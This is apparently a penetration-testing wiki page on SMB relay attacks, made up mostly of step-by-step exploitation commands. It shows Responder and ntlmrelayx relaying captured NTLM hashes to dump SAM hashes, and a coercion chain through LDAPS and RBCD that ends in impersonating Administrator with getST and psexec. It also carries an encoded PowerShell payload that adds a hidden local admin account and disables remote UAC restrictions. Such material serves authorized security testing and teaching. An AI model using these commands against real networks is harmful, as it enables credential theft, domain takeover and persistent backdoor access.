# SMB relay attack

### SMB relay attack

An SMB relay attack is when an attacker catches a user's login attempt and passes it along to another computer, getting in as that user without ever knowing their password. With it, the attacker can log into systems, run commands, and spread across the network - sometimes taking over the whole domain. The problem is that the login isn't tied to a specific computer, so it can be reused somewhere else. The risk depends on whose login gets caught: if it's an admin, the attacker can gain full control. The cause is that SMB signing (a check that verifies who you're really talking to) is turned off, letting the attacker sit in the middle and forward the login unnoticed.

<figure><img src="../../.gitbook/assets/afbeelding (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

The following code blocks shows how to abuse an SMB relay attack on the default manner, and with a coercion attack.<br>

1. **Standard SMB relay attack:**

```bash
##### REQUIREMENTS:
# this can be ran if your machine is part of the internal AD network
# it requires targets that have SMB signing disabled (or enabled but not required)
# CANNOT BE RAN IF RESPONDER IS RUNNING SIMULTANEOUSLY WITH SMB ENABLED
 
##### REFERENCE:
# https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/
 
##### START EXPLOITATION
 
### ----- INIT RESPONDER ----- ###
# 1. start responder for capturing NTLMv2 hashes (make sure SMB is DISABLED)
responder -I {{NIC}} -Pv
 
# NOW ALL NTLMv2 HASHES THAT ARE CAPTURED WILL BE RELAYED ONCE NTLMRELAYX IS STARTED
 
### ----- INIT SMB-RELAY ----- ###
# 1. scan the host to check if smb signing is disabled (or enabled but not required)
nmap --script=smb2-security-mode.nse -p445 {{RHOST}}
 
# 2. create a targets.txt file with hosts that have smb signing disabled (or enabled but not required) - one ip-address per line
...
 
# 3. setup ntlmrelayx.py to relay the captured hashes to the targets and execute a command
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server # this will dump the SAM hashes
 
##### ALTERNATIVES
# A. add a the account 'tempUserG:DiffPword951' to the system, then add tempUserG account to the local admin group && disable remote UAC restrictions (privileged admin)
sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c "powershell -enc bgBlAHQAIAB1AHMAZQByACAAIgB0AGUAbQBwAFUAcwBlAHIARwAiACAAIgBEAGkAZgBmAFAAdwBvAHIAZAA5ADUAMQAiACAALwBhAGQAZAAgADsAIABuAGUAdAAgAGwAbwBjAGEAbABnAHIAbwB1AHAAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAAiAHQAZQBtAHAAVQBzAGUAcgBHACIAIAAvAGEAZABkACAAOwAgAHIAZQBnACAAYQBkAGQAIAAiAEgASwBMAE0AXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABQAG8AbABpAGMAaQBlAHMAXABTAHkAcwB0AGUAbQAiACAALwB2ACAATABvAGMAYQBsAEEAYwBjAG8AdQBuAHQAVABvAGsAZQBuAEYAaQBsAHQAZQByAFAAbwBsAGkAYwB5ACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAxACAALwBmAA=="
 
##### END EXPLOITATION
```

2. **SMB relay attack with coercion:**

```bash
##### DESCRIPTION
# In order to perform an SMB relay attack with coercion, you can use ntlmrelayx with the coerce_plus module of nxc. This will allow you to coerce a target machine to authenticate to you, which will then add a computer account to the domain, add delegation rights to that account and allow it to impersonate users on the target system via S4U2Proxy.
 
##### REQUIREMENTS:
# - LDAP signing and channel binding must be disabled/not enforced on the DC
# - Machine Account Quota (MAQ) > 0 to create a new computer account (default: 10)
# - LDAPS must be available on the DC (computer account creation requires encryption)
# - You can only configure RBCD on the machine whose authentication you relay (SELF write access)
# - The user to impersonate must not be in Protected Users or have the "sensitive and cannot be delegated" flag
 
##### REFERENCE:
# https://labs.jumpsec.com/ntlm-relaying-making-the-old-new-again/ - # LDAP Signing - RBCD
 
##### START EXPLOITATION
# 1. Check if ldap signing is disabled on the target (DC) and if MAQ > 0
nxc ldap {{DOMAIN}}.{{ROOTDNS}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -M maq
 
# 2. setup impacket-ntlmrelayx
impacket-ntlmrelayx -t ldaps://{{DOMAIN}}.{{ROOTDNS}} --delegate-access --remove-mic -smb2support
 
# 3. Coerce target machine to authenticate to us (separate terminal), this will add a computer account to the domain, add delegation rights to that account and allow it to impersonate users on the target system via S4U2Proxy
nxc smb {{TARGET_HOST}} -u '{{USERNAME}}' -p '{{PASSWORD}}' -d '{{DOMAIN}}'.'{{ROOTDNS}}' -M coerce_plus -o LISTENER={{LHOST}}
 
# Expected output from ntlmrelayx:
# [*] (SMB): Authenticating against ldaps://{{DOMAIN}}.{{ROOTDNS}} SUCCEED
# [*] Adding new computer with username: XXXXXXXX$ and password: YYYYYYYY result: OK
# [*] Delegation rights modified succesfully!
# [*] XXXXXXXX$ can now impersonate users on {{TARGET_NAME}}$ via S4U2Proxy
 
# 4. Note the created computer account and password from output, then request A service ticket
impacket-getST -spn 'cifs/{{target_hostname}}.{{DOMAIN}}.{{ROOTDNS}}' -impersonate "Administrator" '{{DOMAIN}}'/'{{NEW_COMPUTER}}$':'{{NEW_PASSWORD}}' -dc-ip {{RHOST}}
 
# once the kerberos ticket is retrieved, you can impersonate the administrator user on the target system (for example:)
export KRB5CCNAME=Administrator@{{target_hostname}}.{{DOMAIN}}.{{ROOTDNS}}@{{DOMAIN}}.{{ROOTDNS}}.ccache
nxc smb {{target_hostname}} --use-kcache
psexec.py -k {{target_hostname}}.{{DOMAIN}}.{{ROOTDNS}}
 
##### END EXPLOITATION
```

